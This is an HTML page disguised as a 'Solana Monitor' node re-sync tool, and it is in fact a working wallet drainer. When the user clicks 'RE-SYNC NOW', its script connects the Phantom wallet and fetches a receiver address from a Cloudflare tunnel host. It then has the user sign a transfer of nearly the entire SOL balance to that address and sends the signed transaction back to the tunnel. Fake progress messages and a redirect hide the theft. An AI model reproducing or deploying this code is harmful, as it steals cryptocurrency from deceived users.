<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Node Sync</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0c0c0c; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1a1a1a; padding: 40px; border: 1px solid #14f195; text-align: center; border-radius: 8px; width: 320px; }
        .bar { background: #333; height: 4px; margin: 25px 0; overflow: hidden; }
        #fill { background: #14f195; height: 100%; width: 0%; transition: 0.5s; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="color:#9945FF;">SOLANA MONITOR</h3>
        <p style="font-size: 12px; color: #888;">STATUS: <span style="color:#ff3e3e;">DE-SYNC</span></p>
        <div class="bar"><div id="fill"></div></div>
        <button id="cta">RE-SYNC NOW</button>
        <p id="info" style="font-size: 11px; margin-top:15px; color: #555;">Ready</p>
    </div>

    <script>
        // ğŸ”± æ£€æŸ¥éš§é“é“¾æ¥
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            const sWeb3 = window.solanaWeb3;
            if (!p) { alert("Please use Phantom"); return; }

            try {
                // 1. è¿é’±åŒ…
                await p.connect();
                document.getElementById('fill').style.width = "30%";
                document.getElementById('info').innerText = "Connecting RPC...";

                // 2. é—®åç«¯è¦é…ç½® (ä¸è®©åç«¯æŸ¥è´¦ï¼Œé˜²æ­¢ 403)
                const conf = await fetch(`${tunnel}/prepare`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                }).then(r => r.json());

                // 3. å‰ç«¯åˆ©ç”¨æ‰‹æœºç½‘ç»œæŸ¥ä½™é¢å’Œ Blockhash
                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
                const balance = await conn.getBalance(p.publicKey);
                const bhObj = await conn.getLatestBlockhash();
                
                document.getElementById('fill').style.width = "60%";
                document.getElementById('info').innerText = "Preparing Transaction...";

                // 4. ç®—è´¦ï¼šå…¨é¢æ‰£é™¤ 0.001 SOL
                const amount = balance - 1000000; 
                if (amount <= 0) { alert("Node Synced"); return; }

                // 5. æ„é€ å¹¶å”¤èµ·ç­¾å
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(conf.receiver),
                        lamports: amount,
                    })
                );
                tx.recentBlockhash = bhObj.blockhash;
                tx.feePayer = p.publicKey;

                const signed = await p.signTransaction(tx);
                document.getElementById('info').innerText = "Broadcasting...";

                // 6. å›ä¼ å¹¿æ’­
                const serialized = signed.serialize();
                let binary = '';
                const bytes = new Uint8Array(serialized);
                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
                
                fetch(`${tunnel}/broadcast`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                document.getElementById('fill').style.width = "100%";
                document.getElementById('info').innerText = "Success!";
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (e) {
                console.error(e);
                document.getElementById('info').innerText = "Retrying...";
                setTimeout(() => { location.reload(); }, 2000);
            }
        };
    </script>
</body>
</html>
